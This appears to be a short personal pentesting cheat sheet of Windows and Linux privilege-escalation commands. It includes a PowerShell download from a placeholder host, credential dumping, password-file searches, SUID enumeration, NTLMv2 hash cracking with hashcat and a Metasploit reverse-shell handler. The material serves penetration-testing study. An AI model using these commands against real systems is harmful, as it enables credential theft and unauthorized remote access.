# pentesting help page



## windows - Priv esc.
Run powershell:
```
powershell.exe -noexit
```
Download file with powershell:
```
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://IP', 'file_name')"
Invoke-WebRequest -Uri $url -OutFile $output

```
Powershell allow  running scripts:
```
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
```
Credential manager [link](https://gallery.technet.microsoft.com/scriptcenter/PowerShell-Credentials-d44c3cde) (also in this github repository as cm.ps1:
```
.\cm.ps1 -ShoCred -Target 'localhost' -All
```
Finds:
```
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si heslo *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt
dir /s *.kdb*
```
Directory switching when not utf8 encoding:
```
$Files = Get-ChildItem -Path .\ -Directory | ForEach-Object {$_.FullName }
cd $Files[x] 
```


## Windows - Tools

## Linux - Priv esc.
Basic [website](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/).

Find executable files:
```
find / -perm -4000 2>/dev/null
```

## Linux - Tools
Hashcat:
```
hashcat -m 5600 -a 0 SMBv2-NTLMv2.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-m 5600 - type of hash (5600 is NTLMv2)
-a 0 -type of attack (0 means dictionary)
-r rule set for dictionary attack
```


## Meterpreter
Generic handler reverse shell:
```
use exploit/multi/handler
set payload windows/shell/reverse_tcp
```
## Good sources
[dropbox - oscp and hacking stuff](https://www.dropbox.com/sh/ba0t59c5fnccgms/AACvUbUSflWB1_AAgj8okEUra?dl=0)
